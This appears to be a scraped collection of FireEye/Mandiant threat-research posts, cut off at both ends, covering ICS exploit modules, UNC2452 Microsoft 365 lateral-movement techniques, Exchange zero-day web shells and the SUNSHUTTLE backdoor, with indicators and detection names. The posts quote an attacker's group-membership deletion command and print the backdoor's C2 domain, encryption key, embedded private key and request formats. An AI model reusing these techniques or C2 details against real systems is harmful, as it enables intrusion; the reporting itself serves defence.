large part to the efforts of Russian security research firm GLEG . Figure 3: ICS exploit modules by framework Metasploit framework exploit modules deserve particular attention. Even though it has the fewest number of modules, Metasploit is freely available and broadly used for IT penetration testing, while Core Impact and Immunity Canvas are both commercial tools. This makes Metasploit the most accessible of the three frameworks. However, it means that module development and maintenance are provided by the community, which is likely contributing to the lower number of modules. It is also worthwhile to examine the number of exploit modules by ICS product vendor. The results of this analysis are depicted in Figure 4, which displays vendors with the highest number of exploit modules (over 10). Figure 4: Vendors with 10 exploit modules or more Figure 4 does not necessarily indicate which vendors are the most targeted, but which products have received the most attention from exploit writers. Several factors could contribute to this, including the availability of software to experiment with, general ease of writing an exploit on particular vulnerabilities, or how the vulnerability matches against the expertise of the exploit writers. Some of the vendors included in the graph have been acquired by other companies, however we tracked them separately as the vulnerability was identified prior to the acquisition. One example of this is Schneider Electric, which acquired 7-Technologies in 2011 and altered the names of their product portfolio. We also highlight that the graph solely counts exploit modules, regardless of the vulnerability exploited. Modules from separate frameworks could target the same vulnerability and would each be counted separately. ICS Cyber Operation Tools and Software Exploitation Frameworks Bridge Knowledge and Expertise Gaps ICS-specific cyber operation tools often released by researchers and security practitioners are useful assets to help organizations learn about ongoing threats and product vulnerabilities. However, as anything publicly available, they can also lower the bar for threat actors that hold an interest in targeting OT networks. Although successful attacks against OT environments will normally require a high level of skills and expertise from threat actors, the tools and exploit modules discussed in this post are making it easier to bridge the knowledge gap. Awareness about the proliferation of ICS cyber operation tools should serve as an important risk indicator of the evolving threat landscape. These tools provide defenders with an opportunity to perform risk assessments in test environments and to leverage aggregated data to communicate and obtain support from company executives. Organizations that do not pay attention to available ICS cyber operation tools risk becoming low-hanging fruit for both sophisticated and unexperienced threat actors exploring new capabilities. FireEye Intelligence customers have access to the full list and analysis of ICS cyber operation tools and exploit modules. Visit our website to learn more about the FireEye Mandiant Cyber Physical Threat Intelligence subscription . Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/01/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-01-19",
                    "source": "www.fireeye.com"
                },
                "text": "UPDATE (Mar. 18): Mandiant recently observed targeted threat actors modifying mailbox folder permissions of user mailboxes to maintain persistent access to the targeted users' email messages. This stealthy technique is not usually monitored by defenders and provides threat actors a way to access the desired email messages using any compromised credentials. The white paper, blog post and Azure AD Investigator tool have been updated to reflect these findings. Mandiant would like to thank the members of Microsoft’s Detection and Response Team (DART) for their collaboration on this research. In December 2020, FireEye uncovered and publicly disclosed a widespread attacker campaign that is being tracked as UNC2452 . In some, but not all, of the intrusions associated with this campaign where Mandiant has visibility, the attacker used their access to on-premises networks to gain unauthorized access to the victim’s Microsoft 365 environment. Goals and Objectives Methodologies that UNC2452 and other threat actors have used to move laterally from on-premises networks to the Microsoft 365 cloud have been detailed in our white paper, Remediation and Hardening Strategies for Microsoft 365 to Defend Against UNC2452 . The paper also discusses how organizations can proactively harden their environments and remediate environments where similar techniques have been observed. Mandiant is releasing an auditing script, Azure AD Investigator , through its GitHub repository that organizations can use to check their Microsoft 365 tenants for indicators of some of the techniques used by UNC2452. The script will alert administrators and security practitioners to artifacts that may require further review to determine if they are truly malicious or part of legitimate activity. Many of the attacker techniques detailed in the white paper are dual-use in nature—they can be used by threat actors but also by legitimate tools. Therefore, a detailed review for specific configuration parameters may be warranted, including correlating and verifying that configurations are aligned with authorized and expected activities. Attacker Tactics, Techniques and Procedures (TTPs) Mandiant has observed UNC2452 and other threat actors moving laterally to the Microsoft 365 cloud using a combination of four primary techniques: Steal the Active Directory Federation Services (AD FS) token-signing certificate and use it to forge tokens for arbitrary users (sometimes described as Golden SAML ). This would allow the attacker to authenticate into a federated resource provider (such as Microsoft 365) as any user, without the need for that user’s password or their corresponding multi-factor authentication (MFA) mechanism. Modify or add trusted domains in Azure AD to add a new federated Identity Provider (IdP) that the attacker controls. This would allow the attacker to forge tokens for arbitrary users and has been described as an Azure AD backdoor . Compromise the credentials of on-premises user accounts that are synchronized to Microsoft 365 that have high privileged directory roles, such as Global Administrator or Application Administrator. Backdoor an existing Microsoft 365 application by adding a new application or service principal credential in order to use the legitimate permissions assigned to the application, such as the ability to read email, send email as an arbitrary user, access user calendars, etc. Modify the permissions of folders in a victim mailbox (such as the inbox) to make its contents readable by any other user in the victim’s Microsoft 365 environment. Read the white paper for a detailed overview of each technique, including practical remediation and hardening strategies, and check out our auditing script, Azure AD Investigator . Detections FireEye Helix Detection MITRE Technique Detection Logic MICROSOFT AZURE ACTIVE DIRECTORY [Risky Sign-In] T1078.004 Alert on suspicious logon activity as detected by Azure Identity Protection OFFICE 365 [Federated Domain Set] T1550 Alert on new domain federation in Office 365 OFFICE 365 [Modified Domain Federation Settings] T1550 Alert of modification to domain federations settings in Office 365 OFFICE 365 [User Added Credentials to Service Principal] T1098.011 Alert on addition of certificates or passwords added to Service Principals OFFICE 365 ANALYTICS [Abnormal Logon] T1078.004 Alert on suspicious login activity based on heuristics WINDOWS METHODOLOGY [ADFS Dump] TA0006 T1552 T1552.004 T1199 Alert on activity access requests for the AD FS Distributed Key Manager (DKM) container in Active Directory OFFICE 365 [Mailbox Folder Permission Change – Inbox and Top Of Information Store] T1098.002 Alert on suspicious modifications of mailbox folder permissions for the inbox or top of information store. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-03-04",
                    "source": "www.fireeye.com"
                },
                "text": "Beginning in January 2021, Mandiant Managed Defense observed multiple instances of abuse of Microsoft Exchange Server within at least one client environment. The observed activity included creation of web shells for persistent access, remote code execution, and reconnaissance for endpoint security solutions. Our investigation revealed that the files created on the Exchange servers were owned by the user NT AUTHORITY\\SYSTEM , a privileged local account on the Windows operating system. Furthermore, the process that created the web shell was UMWorkerProcess.exe , the process responsible for Exchange Server’s Unified Messaging Service. In subsequent investigations, we observed malicious files created by w3wp.exe , the process responsible for the Exchange Server web front-end. In response to this activity, we built threat hunting campaigns designed to identify additional Exchange Server abuse. We also utilized this data to build higher-fidelity detections of web server process chains. On March 2, 2021, Microsoft released a blog post that detailed multiple zero-day vulnerabilities used to attack on-premises versions of Microsoft Exchange Server. Microsoft also issued emergency Exchange Server updates for the following vulnerabilities: CVE Risk Rating Access Vector Exploitability Ease of Attack Mandiant Intel CVE-2021-26855 Critical Network Functional Easy Link CVE-2021-26857 Medium Network Functional Easy Link CVE-2021-26858 Medium Network Functional Easy Link CVE-2021-27065 Medium Network Functional Easy Link Table 1: List of March 2021 Microsoft Exchange CVEs and FireEye Intel Summaries The activity reported by Microsoft aligns with our observations. FireEye currently tracks this activity in three clusters, UNC2639, UNC2640, and UNC2643. We anticipate additional clusters as we respond to intrusions. We recommend following Microsoft’s guidance and patching Exchange Server immediately to mitigate this activity. Based on our telemetry, we have identified an array of affected victims including US-based retailers, local governments, a university, and an engineering firm. Related activity may also include a Southeast Asian government and Central Asian telecom. Microsoft reported the exploitation occurred together and is linked to a single group of actors tracked as “HAFNIUM”, a group that has previously targeted the US-based defense companies, law firms, infectious disease researchers, and think tanks. In this blog post, we will detail our observations on the active investigations we are currently performing. As our experience with and knowledge of this threat actor grows, we will update this post or release new technical details as appropriate. For our Managed Defense Customers, we have launched a Community Protection Event that will provide frequent updates on this threat actor and activity. We will be discussing these attacks more in an upcoming webinar on Mar. 17, 2021 . From Exploit to Web Shell Beginning in January 2021, Mandiant Managed Defense observed the creation of web shells on one Microsoft Exchange server file system within a customer’s environment. The web shell, named help.aspx (MD5: 4b3039cf227c611c45d2242d1228a121), contained code to identify the presence of (1) FireEye xAgent, (2) CarbonBlack, or (3) CrowdStrike Falcon endpoint products and write the output of discovery. Figure 1 provides a snippet of the web shell’s code. Figure 1: Snippet of the web shell help.aspx, crafted to identify the presence of endpoint security software on a victim system The web shell was written to the system by the UMWorkerProcess.exe process, which is associated with Microsoft Exchange Server’s Unified Messaging service. This activity suggested exploitation of CVE-2021-26858. Approximately twenty days later, the attacker placed another web shell on a separate Microsoft Exchange Server. This second, partially obfuscated web shell, named iisstart.aspx (MD5: 0fd9bffa49c76ee12e51e3b8ae0609ac), was more advanced and contained functions to interact with the file system. As seen in Figure 2, the web shell included the ability to run arbitrary commands and upload, delete, and view the contents of files. Figure 2: Snippet of iisstart.aspx, uploaded by the attacker in late January 2021 While the use of web shells is common amongst threat actors, the parent processes, timing, and victim(s) of these files clearly indicate activity that commenced with the abuse of Microsoft Exchange. In March 2021, in a separate environment, we observed a threat actor utilize one or more vulnerabilities to place at least one web shell on the vulnerable Exchange Server. This was likely to establish both persistence and secondary access, as in other environments. In this case, Mandiant observed the process w3wp.exe , (the IIS process associated with the Exchange web front-end) spawning cmd.exe to write a file to disk. The file, depicted in Figure 3, matches signatures for the tried-and-true China Chopper . Figure 3: Snippet of China Chopper web shell found on a compromised Exchange Server system We observed that in at least two cases, the threat actors subsequently issued the following command against the Exchange web server: net group \"Exchange Organization administrators\" administrator /del /domain. This command attempts to delete the administrator user from the Exchange Organizations administrators group, beginning with the Domain Controller in the current domain. If the system is in a single-system domain, it will execute on the local computer. Per Microsoft’s blog, they have identified additional post-exploitation activities, including: Credential theft via dumping of LSASS process memory. Compression of data for exfiltration via 7-Zip. Use of Exchange PowerShell Snap-ins to export mailbox data. Use of additional offensive security tools Covenant , Nishang , and PowerCat for remote access. The activity we have observed, coupled with others in the information security industry, indicate that these threat actors are likely using Exchange Server vulnerabilities to gain a foothold into environments. This activity is followed quickly by additional access and persistent mechanisms. As previously stated, we have multiple ongoing cases and will continue to provide insight as we respond to intrusions. Investigation Tips We recommend checking the following for potential evidence of compromise: Child processes of C:\\Windows\\System32\\inetsrv\\w3wp.exe on Exchange Servers, particularly cmd.exe . Files written to the system by w3wp.exe or UMWorkerProcess.exe . ASPX files owned by the SYSTEM user New, unexpected compiled ASPX files in the Temporary ASP.NET Files directory Reconnaissance, vulnerability-testing requests to the following resources from an external IP address: /rpc/ directory /ecp/DDI/DDIService.svc/SetObject Non-existent resources With suspicious or spoofed HTTP User-Agents Unexpected or suspicious Exchange PowerShell SnapIn requests to export mailboxes In our investigations to date, the web shells placed on Exchange Servers have been named differently in each intrusion, and thus the file name alone is not a high-fidelity indicator of compromise. If you believe your Exchange Server was compromised, we recommend investigating to determine the scope of the attack and dwell time of the threat actor. Furthermore, as system and web server logs may have time or size limits enforced, we recommend preserving the following artifacts for forensic analysis: At least 14 days of HTTP web logs from the inetpub\\Logs\\LogFiles directories (include logs from all subdirectories) The contents of the Exchange Web Server (also found within the inetpub folder) At least 14 days of Exchange Control Panel (ECP) logs, located in Program Files\\Microsoft\\Exchange Server\\v15\\Logging\\ECP\\Server Microsoft Windows event logs We have found significant hunting and analysis value in these log folders, especially for suspicious CMD parameters in the ECP Server logs. We will continue updating technical details as we observe more related activity. Technical Indicators The following are technical indicators we have observed, organized by the threat groups we currently associate with this activity. To increase investigation transparency, we are including a Last Known True, or LKT, value for network indicators. The LKT timestamp indicates the last time Mandiant knew the indicator was associated with the adversary; however, as with all ongoing intrusions, a reasonable time window should be considered. UNC2639 Indicator Type Note 165.232.154.116 Network: IP Address Last known true: 2021/03/02 02:43 182.18.152.105 Network: IP Address Last known true: 2021/03/03 16:16 UNC2640 Indicator Type MD5 help.aspx File: Web shell 4b3039cf227c611c45d2242d1228a121 iisstart.aspx File: Web shell 0fd9bffa49c76ee12e51e3b8ae0609ac UNC2643 Indicator Type MD5/Note Cobalt Strike BEACON File: Shellcode 79eb217578bed4c250803bd573b10151 89.34.111.11 Network: IP Address Last known true: 2021/03/03 21:06 86.105.18.116 Network: IP Address Last known true: 2021/03/03 21:39 Detecting the Techniques FireEye detects this activity across our platforms. The following contains specific detection names that provide an indicator of Exchange Server exploitation or post-exploitation activities we associated with these threat actors. Platform (s) Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning FEC_Trojan_ASPX_Generic_2 FE_Webshell_ASPX_Generic_33 FEC_APT_Webshell_ASPX_HEARTSHELL_1 Exploit.CVE-2021-26855 Endpoint Security Real-Time (IOC) SUSPICIOUS CODE EXECUTION FROM EXCHANGE SERVER (EXPLOIT) ASPXSPY WEBSHELL CREATION A (BACKDOOR) PROCDUMP ON LSASS.EXE (METHODOLOGY) TASKMGR PROCESS DUMP OF LSASS.EXE A (METHODOLOGY) NISHANG POWERSHELL TCP ONE LINER (BACKDOOR) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) POWERSHELL DOWNLOADER (METHODOLOGY) Malware Protection (AV/MG) Trojan.Agent.Hafnium.A Module Coverage [Process Guard] - prevents dumping of LSASS memory using the procdump utility. Helix WINDOWS METHODOLOGY [Unusual Web Server Child Process] MICROSOFT EXCHANGE [Authentication Bypass (CVE-2021-26855)] Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/03/sunshuttle-second-stage-backdoor-targeting-us-based-entity.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-03-04",
                    "source": "www.fireeye.com"
                },
                "text": "Executive Summary In August 2020, a U.S.-based entity uploaded a new backdoor that we have named SUNSHUTTLE to a public malware repository. SUNSHUTTLE is a second-stage backdoor written in GoLang that features some detection evasion capabilities. Mandiant observed SUNSHUTTLE at a victim compromised by UNC2452, and have indications that it is linked to UNC2452, but we have not fully verified this connection. Please see the Technical Annex for relevant MITRE ATT&CK techniques (T1027, T1027.002, T1059.003, T1071.001, T1105, T1140, T1573.001). The activity discussed in this blog post is also detailed in a Microsoft blog post . We thank the team at Microsoft and other partners for their great collaboration in tracking this actor. Threat Detail Mandiant Threat Intelligence discovered a new backdoor uploaded by a U.S.-based entity to a public malware repository in August 2020 that we have named SUNSHUTTLE. SUNSHUTTLE is written in GO, and reads an embedded or local configuration file, communicates with a hard-coded command and control (C2) server over HTTPS, and supports commands including remotely uploading its configuration, file upload and download, and arbitrary command execution. Notably, SUNSHUTTLE uses cookie headers to pass values to the C2, and if configured, can select referrers from a list of popular website URLs to help such network traffic “blend in.” The SUNSHUTTLE backdoor file examined, “Lexicon.exe” (MD5: 9466c865f7498a35e4e1a8f48ef1dffd), was written in GoLang. The file unpacks into MD5: 86e89349fefcbdd9d2c80ca30fa85511. The infection vector for SUNSHUTTLE is not known. It is most likely a second-stage backdoor dropped after an initial compromise. The SUNSHUTTLE sample uses the actor-controlled server “reyweb[.]com” for C2. “Reyweb[.]com” is registered anonymously via NameSilo, a domain provider who accepts bitcoin payment and has been used for C2 registration by state-sponsored APTs in the past, including Russia-nexus actors and Iran-nexus APTs Mandiant observed SUNSHUTTLE at a victim compromised by UNC2452, and have indications that it is linked to UNC2452, but we have not fully verified this connection. Please see FireEye’s resource center for background on UNC2452 and the SUNBURST campaign . Outlook and Implications The new SUNSHUTTLE backdoor is a sophisticated second-stage backdoor that demonstrates straightforward but elegant detection evasion techniques via its “blend-in” traffic capabilities for C2 communications. SUNSHUTTLE would function as second-stage backdoor in such a compromise for conducting network reconnaissance alongside other SUNBURST-related tools. Technical Annex Mandiant Threat Intelligence discovered a sample of the SUNSHUTTLE backdoor uploaded to an online multi-Antivirus scan service. SUNSHUTTLE is a backdoor, written in GO, that reads an embedded or local configuration file, communicates with its C2 server over HTTPS and supports commands including remotely updating its configuration, file upload and download, and arbitrary command execution. Lexicon.exe (MD5: 9466c865f7498a35e4e1a8f48ef1dffd) C2: reyweb[.]com UNAVAILABLE (MD5: 86e89349fefcbdd9d2c80ca30fa85511) Unpacked version of 9466c865f7498a35e4e1a8f48ef1dffd Infection Vector For the samples analyzed, the infection vector is not known. Execution Execution Summary SUNSHUTTLE is a backdoor written in GoLang. Once SUNSHUTTLE is executed, a high-level description of the execution is the following: Configuration settings determined Request a “session key” from the C2 Retrieve the “session key” from the C2 Once a session key is retrieved, SUNSHUTTLE begins command request beaconing loop Begin command request beaconing Resolve command and perform action The SUNSHUTTLE sample analyzed retains the names of the routines used by the malware, which include the following: main.request_session_key main.define_internal_settings main.send_file_part main.clean_file main.send_command_result main.retrieve_session_key main.save_internal_settings main.resolve_command main.write_file main.beaconing main.wget_file main.fileExists main.encrypt main.decrypt main.random main.removeBase64Padding main.addBase64Padding main.delete_empty main.Unpad main.GetMD5Hash main.Pad Note: Throughout the SUNSHUTTLE backdoor, unique string identifiers are used to indicate the operation being performed to the C2 via a Cookie header, and unique string identifiers are also used to validate and parse response content from the C2. These unique string values are thought to be unique and random per compiled sample. Initial Execution Once executed, the SUNSHUTTLE backdoor enumerates the victim’s MAC address and compares it to a hardcoded MAC address value “c8:27:cc:c2:37:5a”. If a match is found the backdoor exits. The MAC address is likely a default MAC address for the Windows sandbox network adapter. Figure 1: Mac address check Configuration If the check is successful, the SUNSHUTTLE backdoor then enters a routine named “﻿main_define_internal_settings”, which handles creation of the configuration file if one doesn’t already exist in the directory from which SUNSHUTTLE is running. For the sample analyzed, the configuration filename is “config.dat.tmp”. The configuration data is Base64 encoded and AES-256 encrypted using the following key: hz8l2fnpvp71ujfy8rht6b0smouvp9k8 The configuration has the following example values when Base64 decoded and AES decrypted: 48b9e25491e088a35105274cae0b9e67|5-15|0|0|TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2V ja28vMjAxMDAxMDEgRmlyZWZveC83NS4w The configuration holds several values delimited by a “|” character, which are briefly described as follows. 48b9e25491e088a35105274cae0b9e67 MD5 hash of the current timestamp calculated during execution. 5-15 Lower/upper limits used to randomly generate sleep times as SUNSHUTTLE executes 0 0 or 1 — Utilize “blend-in” traffic requests. Internally called “false_requesting” 0 Activate execution timestamp (0 by default) — execution \"activates\" or continues if current time is greater than the value in the configuration TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2Vja2 8vMjAxMDAxMDEgRmlyZWZveC83NS4w Base64-encoded User-agent used in HTTPS requests Decoded: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 If set in the configuration, the “blend-in” traffic occurs as the malware executes and transitions through its routines. The following URLs are leveraged for the “blend-in” requests: https://reyweb[.]com/icon.ico https://reyweb[.]com/icon.png https://reyweb[.]com/script.js https://reyweb[.]com/style.css https://reyweb[.]com/css/style.css https://reyweb[.]com/css/bootstrap.css https://reyweb[.]com/scripts/jquery.js https://reyweb[.]com/scripts/bootstrap.js https://cdn.mxpnl[.]com/ https://cdn.google[.]com/ https://cdn.jquery[.]com/ https://code.jquery[.]com/ https://cdn.cloudflare[.]com/ Session Key Mechanism SUNSHUTTLE performs initial requests to the C2 in order to request and then retrieve what it internally refers to as a session key. The retrieved session key from the C2 appears to be RSA decrypted using the following private key that is embedded in SUNSHUTTLE and believed to be unique per compiled sample. Analysis is on-going on how the decrypted session key is used, but it is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines. -----BEGIN PRIVATE KEY----- MIIEowIBAAKCAQEA0Aj/3K3m/rKNESwUfHC9qAhnsNYA9bJ4HQ30DPsfPDvbbHZm Uj5nyp2abjYZYMQbWa2+ZO4Ixgfdm0FzsAH/haKIN4sSkbw+YRESYW35MnMI3Adf mj/eK/yKNblyoe/7iWP3nz+y4Q/QI0L6BrF7VodTaDYtDup3iI+B5zjmhElf9Fmg S1JiDUgydz5VXJR/esv6hB7GMfEb/3sIAzv5qcwEvGK5HH1EzQ7zjauyhbsF9pHR zCFYlvW4OtaU0o3xjVufo5UwYRS5p/EFpof45zuJGLJ02cKUmxc0OX53t3Bn9WXY aDDhYp/RPzywG8N9gTBv8rKxRIsFxxKu+8wK+QIDAQABAoIBAGe4hPDe13OXTBQK uTAN+dEkV6ZoHFRjpdU+lrY+IiWi5lSed4d7y73OdCeM23xOaiB9KpchwsgRNeDp cieH54EWNvoSYbC9fRBiNZrT/NG1Xu5s0rKSM1AU+kes7UVl5DBs4hHI7YOeobRi +UuLA6ZxlBk6IZ71MaGpgyfoS64aDMvZDtcaTEGzw6dRQAU9255DTIc2YYbq8MqL zSafD5eBDH3Izmblg0kXiidec1A1sytz5u8xW4XckHfp4xePLVw/RvLJGqNJMK5M 7tXAFwPzg+u4k7ce7uNw9VWW7n28T9xznUux1gtPQj1N6goDaBaOqY+h0ia9F1RP wu6ZtG0CgYEA8vCFmAGmMz4vjO04ELyPnvnaS6CReYCVzmvNugIDlxBLDGCnKBVx et7qEk3gMkbtcDUOZpXQAIVCWQNupAhI0t5bb/Pfw3HtH3Xt5NRUYmwxTgNRe06D i4ICsg2+8TDinjne9hzsEe9DYE2WRrtLMJ+IPD+QE94J3Sei03k1wpMCgYEA2zga Tff6jQeNn9G0ipHa1DvJmi98px51o0r7TUfZRxJfgg4ckyMsZUHKALrZszKAnxP7 MXYrJuOHpsp0EZc1e3uTjFzrKyKRTQ78c7MNGv07w1PlZuNLtkoqepUjkQzdxKZO g9gG0O4lC5jjnSg8jUSChhZn+jrU8Vx7ByOP98MCgYAWi5+6RZzo8IJ1L6aeVwF1 HXbWweX+QqKkb3i+JGW05Twxv96DZ8oKPxm17Sg7Qj3Sxfm6J3kQM02++QSRkHtB poUR1K4Vc0MwQj97lwDlyWih9sjfCqBGmCAr6f6oX4MIcBJzAKgf2faEv26MzeDi eEuqW7PBRD/iGEWSHpOQpQKBgQDRgV+aTjk0mRhfugHKQLSbCnyUj3eZG8IfiiR7 agQcKVH/sE7cy8u9Bc/xPKGb4dMMtQLm9WEuLFtTKr8cpJ8nYSXVCmRx9/pXY9Af HuqSdZutBDwERYvxLhZEys2P7XTwYGQ/GrEA8eeTms1FP9QGyofXcAh1G86w0Mp/ Oxx3EwKBgHXxgQa4/ngTlMNhWP+IvHOlOVAxDK2GL3XQdr8fudZe9c1d7VzIbYj6 gbwLT9qi0wG5FAWqH163XucAirT6WCtAJ3tK0lfbS7oWJ7L/Vh1+vOe6jfS/nQna Ao2QPbN8RiltHeaAq0ZfrgwrQuP5fmigmBa5lOWID/eU2OLlvJGi -----END PRIVATE KEY--- After the configuration is created or read from, SUNSHUTTLE enters a routine named “﻿main_request_session_key”. The malware will iterate over this routine until it’s successful, sleeping a period of time after each iteration. Inside the “﻿main_request_session_key” routine, SUNSHUTTLE constructs an HTTPS request to its configured C2. Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response. If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine. The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key. The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines. Commanding Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and “resolve_command” routines in a loop. SUNSHUTTLE first issues a beacon to retrieve a command. After, SUNSHUTTLE will enter the routine “resolve_command”, which parses the response content to determine which command should be run. Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution. Figure 2: Resolve command graph The content returned from the C2 after the “main_beaconing” routine is Base64 decoded and AES decrypted. A check is performed to ensure the decrypted content doesn’t contain the following string: Cp5RTQ31R1 As noted, it is likely these strings are unique per sample and randomly generated at compilation. The decrypted content is parsed for certain unique strings.﻿ Unique string in decrypted response Meaning zSsP2TSJJm3a Update sleep range — save config ﻿aQJmWJzXdYK721mGBI3U Update “false requesting” value – save config ﻿W5VYP9Iu2uyHK Update C2 URL and User-agent – save config ﻿3487wD9t2OZkvqdwRpqPeE Send current timestamp to C2 ﻿ubFxROBRwfswVRWNjLC Update \"activation\" timestamp in the config — save config ﻿TMuhGdA9EHY Upload file to C2 if the file exists 1kG4NaRX83BCMgLo38Bjq Execute command – return “EXECED” if successful hB0upT6CUmdRaR2KVBvxrJ Execute command – return results/output N/A (other string criteria met) Provides terminal command execution N/A (other string criteria met) Download file from C2 Files Dropped After successful execution of the malware, it drops the following files to the victim’s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file Persistence Method The SUNSHUTTLE malware was not observed setting its own persistence. It is likely the persistence is set outside of the execution of SUNSHUTTLE. Network Communications SUNSHUTTLE uses the cookie header to pass values to the C2. Additionally, a referrer is selected from the following list, presumably to make the traffic blend in if traffic is being decrypted for inspection: www.bing.com www.yahoo.com www.google.com www.facebook.com The cookie headers vary slightly depending on the operation being performed. The following is an example request to the C2 from the “request_session_key” routine. Victim to C2 GET /assets/index.php HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Cookie: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI; iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78 Referer: www.facebook.com Accept-Encoding: gzip Within the Cookie header, these values represent the following: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67 Timestamp MD5 contained within the configuration P5hCrabkKf=gZLXIeKI “P5hCrabkKf=” contains a unique string based on which routine is performing the request (see the following table). iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx “i4zICToyI70Yeidf1f7rWjm5foKX2Usx” is hard coded within the SUNSHUTTLE backdoor. It possibly represents a payload identifier b7XCoFSvs1YRW=78 Unknown purpose. This value is only included in request_session_key and retrieve_session_key requests. As mentioned, the cookie value “P5hCrabkKf=” contained in each request signifies the operation that is being performed. “P5hCrabkKf=” Cookie Value Meaning gZLXIeK main_request_session_key do1KiqzhQ main_clean_file t5UITQ2PdFg5 main_wget_file cIHiqD5p4da6OeB main_retrieve_session_key xpjQVt3bJzWuv main_send_file_part S4rgG1WifHU main_send_command_result After successful installation / initialization of the malware, it proceeds to make the following callback to the C2 server reyweb[.]com via TCP/443 HTTPS: Victim to C2 GET /assets/index.php HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Cookie: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI; iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78 Referer: www.facebook.com Accept-Encoding: gzip Victim to C2 GET /assets/index.php HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Cookie: HjELmFxKJc=48b9e25491e088a35105274cae0b9e67; P5hCrabkKf=gZLXIeKI; iN678zYrXMJZ=i4zICToyI70Yeidf1f7rWjm5foKX2Usx; b7XCoFSvs1YRW=78 Referer: www.yahoo.com Accept-Encoding: gzip Additionally, if the “fake_requesting” configuration value is set to 1, SUNSHUTTLE will generate traffic meant to blend in with real traffic. Examples of those requests are as follows: Victim to C2 GET /icon.png HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Referer: www.google.com Accept-Encoding: gzip Victim to C2 GET /css/style.css HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Referer: www.facebook.com Accept-Encoding: gzip Victim to C2 GET /css/bootstrap.css HTTP/1.1 Host: reyweb[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Referer: www.facebook.com Accept-Encoding: gzip Victim to Legitimate GET / HTTP/1.1 Host: cdn.cloudflare[.]com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0 Referer: www.google.com Accept-Encoding: gzip Appendix: MITRE ATT&CK Framework Technique Description T1027 Obfuscated Files or Information T1027.002 Software Packing T1059.003 Windows Command Shell T1071.001 Web Protocols T1105 Ingress Tool Transfer T1140 Deobfuscate/Decode Files or Information T1573.001 Symmetric Cryptography Appendix: Detecting the Techniques FireEye security solutions provide detection of the SUNSHUTTLE activity across email, endpoint and network levels. The following is a snapshot of existing detections related to activity outlined in this blog post. Platform(s) Detection Name Network Security Email Security Detection On Demand Malware File Scanning Malware File Storage Scanning FE_APT_Backdoor_Win64_SUNSHUTTLE_1 FE_APT_Backdoor_Win_SUNSHUTTLE_1 APT.Backdoor.Win.SUNSHUTTLE APT.Backdoor.Win.SUNSHUTTLE.MVX Endpoint Security Malware Protection (AV/MG) Trojan.GenericKD.34453763 Generic.mg.9466c865f7498a35 Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2021/03/fuzzing-image-parsing-in-windows-uninitialized-memory.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2021-03-03",
                    "source": "www.fireeye.com"
                },
